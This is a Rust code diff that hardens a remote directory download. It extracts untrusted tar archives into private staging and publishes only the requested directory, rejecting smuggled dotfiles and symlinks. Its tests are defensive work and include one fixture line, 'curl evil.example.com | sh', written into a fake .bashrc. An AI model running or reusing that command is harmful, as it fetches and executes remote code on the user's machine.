@@ -1170,9 +1170,93 @@ pub(crate) fn upload_file(
     )
 }
 
-/// Download a remote directory tree to `dst` (which must not exist): the
-/// probe streams a tar of the directory and the local system tar extracts it
-/// into `dst`'s parent. A partial extraction is removed on failure.
+/// A private, process-owned directory to extract an untrusted archive into.
+///
+/// It is created as a sibling of the download target so the finished tree can
+/// be published with a same-filesystem rename, and with `create_dir`, which
+/// fails rather than reusing anything that is already at that path.
+struct DownloadStaging {
+    path: PathBuf,
+}
+
+impl DownloadStaging {
+    fn create(parent: &Path) -> io::Result<Self> {
+        use std::os::unix::fs::DirBuilderExt;
+        static NONCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+        let nonce = NONCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+        let path = parent.join(format!(".forge-download.{}.{nonce}", std::process::id()));
+        std::fs::DirBuilder::new()
+            .mode(0o700)
+            .create(&path)
+            .map_err(|error| {
+                io::Error::other(format!(
+                    "could not create a private staging directory in {}: {error}",
+                    parent.display()
+                ))
+            })?;
+        Ok(Self { path })
+    }
+}
+
+impl Drop for DownloadStaging {
+    /// Always: on failure this removes the partial extraction, and on success
+    /// it removes the now-empty shell the published tree was renamed out of.
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.path);
+    }
+}
+
+/// The one entry a directory download is allowed to have produced.
+///
+/// A remote host answering a download of `~/proj` is asked for a tar of one
+/// directory, but it decides what the archive actually contains. Extracting
+/// straight into the target's parent — which is where the tree has to end up —
+/// let it deliver `proj/...` *and* ordinary relative siblings beside it:
+/// `.bashrc`, `.ssh/authorized_keys`, `.config/forge/config.toml`. Nothing
+/// about those paths is exotic enough for tar to refuse them, and they landed
+/// in the user's home directory. So extraction happens somewhere private, and
+/// the result is only published after it is shown to be the single expected
+/// top-level component and nothing else.
+fn validated_staged_tree(staging: &Path, expected: &std::ffi::OsStr) -> io::Result<PathBuf> {
+    let mut entries = Vec::new();
+    for entry in std::fs::read_dir(staging)? {
+        entries.push(entry?.file_name());
+        if entries.len() > 1 {
+            break;
+        }
+    }
+    let [name] = entries.as_slice() else {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            format!(
+                "the remote host sent {} top-level entries for one directory; refusing to publish any of them",
+                entries.len()
+            ),
+        ));
+    };
+    if name.as_os_str() != expected {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "the remote host sent an archive whose top-level entry is not the requested directory",
+        ));
+    }
+    let staged = staging.join(name);
+    // A top-level symlink would publish a link pointing anywhere the host
+    // chose, under a name the user believes is their own copy of the tree.
+    if !std::fs::symlink_metadata(&staged)?.is_dir() {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "the remote host sent something other than a directory for a directory download",
+        ));
+    }
+    Ok(staged)
+}
+
+/// Download a remote directory tree to `dst` (which must not exist): the probe
+/// streams a tar of the directory, the local system tar extracts it into a
+/// private staging directory beside `dst`, and only a tree that turns out to be
+/// exactly the one requested directory is renamed into place. Staging is
+/// removed on every other path.
 pub(crate) fn download_dir(
     host: &RemoteHost,
     src: &Path,
@@ -1188,27 +1272,34 @@ pub(crate) fn download_dir(
             "download target has no parent directory",
         ));
     };
+    let Some(name) = dst.file_name() else {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidInput,
+            "download target has no file name",
+        ));
+    };
+    let staging = DownloadStaging::create(parent)?;
     let local_argv = vec![
         "tar".to_string(),
         "xf".to_string(),
         "-".to_string(),
         "-C".to_string(),
-        parent.to_string_lossy().into_owned(),
+        staging.path.to_string_lossy().into_owned(),
     ];
 
-    let result = stream_download_dir(
+    stream_download_dir(
         &argv,
         &local_argv,
         MAX_TRANSFER_BYTES,
         TRANSFER_TIMEOUT,
         control.clone(),
-    );
-    if result.is_err() {
-        // Anything at `dst` now is our partial extraction (it did not exist
-        // before); remove it rather than leaving a half-tree behind.
-        let _ = std::fs::remove_dir_all(dst);
-    }
-    result
+    )?;
+    let staged = validated_staged_tree(&staging.path, name)?;
+    // `dst` was proved absent above and the rename is within one directory, so
+    // this either publishes the whole tree or leaves nothing behind. Staging is
+    // still removed by the guard, which by then holds only an empty directory.
+    std::fs::rename(&staged, dst)?;
+    Ok(())
 }
 
 fn stream_download_dir(
@@ -2465,6 +2556,99 @@ pub(crate) fn paste_destination(target_dir: &Path, source: &Path) -> PathBuf {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A hostile host answering a download of `~/proj` returns `proj/...` and,
+    /// beside it, ordinary relative siblings the user's home directory happens
+    /// to be full of. Extraction into the target's parent landed every one of
+    /// them; extraction into private staging plus this check publishes none.
+    #[test]
+    fn a_directory_download_publishes_only_the_directory_that_was_asked_for() {
+        let root = unique_temp_dir("staging");
+        std::fs::create_dir_all(&root).unwrap();
+        let expected = std::ffi::OsStr::new("proj");
+
+        let honest = root.join("honest");
+        std::fs::create_dir(&honest).unwrap();
+        std::fs::create_dir(honest.join("proj")).unwrap();
+        std::fs::write(honest.join("proj/main.rs"), b"fn main() {}").unwrap();
+        assert_eq!(
+            validated_staged_tree(&honest, expected).unwrap(),
+            honest.join("proj")
+        );
+
+        // The archive carried the requested tree *and* a dotfile beside it.
+        let smuggled = root.join("smuggled");
+        std::fs::create_dir(&smuggled).unwrap();
+        std::fs::create_dir(smuggled.join("proj")).unwrap();
+        std::fs::write(smuggled.join(".bashrc"), b"curl evil.example.com | sh\n").unwrap();
+        let error = validated_staged_tree(&smuggled, expected).unwrap_err();
+        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
+        assert!(
+            smuggled.join(".bashrc").exists(),
+            "staging is not published"
+        );
+
+        // One entry, but not the one that was requested.
+        let renamed = root.join("renamed");
+        std::fs::create_dir(&renamed).unwrap();
+        std::fs::create_dir(renamed.join("ssh")).unwrap();
+        assert_eq!(
+            validated_staged_tree(&renamed, expected)
+                .unwrap_err()
+                .kind(),
+            io::ErrorKind::InvalidData
+        );
+
+        // The right name, but a link pointing wherever the host chose.
+        let linked = root.join("linked");
+        std::fs::create_dir(&linked).unwrap();
+        std::os::unix::fs::symlink("/etc", linked.join("proj")).unwrap();
+        assert_eq!(
+            validated_staged_tree(&linked, expected).unwrap_err().kind(),
+            io::ErrorKind::InvalidData
+        );
+
+        // An archive that produced nothing at all is not a download either.
+        let empty = root.join("empty");
+        std::fs::create_dir(&empty).unwrap();
+        assert_eq!(
+            validated_staged_tree(&empty, expected).unwrap_err().kind(),
+            io::ErrorKind::InvalidData
+        );
+
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
+    /// Staging is private to this process and never survives the transfer,
+    /// whichever way the transfer ended.
+    #[test]
+    fn download_staging_is_private_and_always_removed() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let root = unique_temp_dir("staging-lifetime");
+        std::fs::create_dir_all(&root).unwrap();
+
+        let path = {
+            let staging = DownloadStaging::create(&root).unwrap();
+            assert_eq!(
+                std::fs::metadata(&staging.path)
+                    .unwrap()
+                    .permissions()
+                    .mode()
+                    & 0o777,
+                0o700
+            );
+            // Two live stagings in one process never collide, so a second
+            // download cannot extract into the first one's tree.
+            let other = DownloadStaging::create(&root).unwrap();
+            assert_ne!(staging.path, other.path);
+            std::fs::write(staging.path.join("partial"), b"half a tree").unwrap();
+            staging.path.clone()
+        };
+        assert!(!path.exists(), "a partial extraction is never left behind");
+
+        std::fs::remove_dir_all(&root).unwrap();
+    }
 
     fn host_fixture() -> RemoteHost {
         RemoteHost {
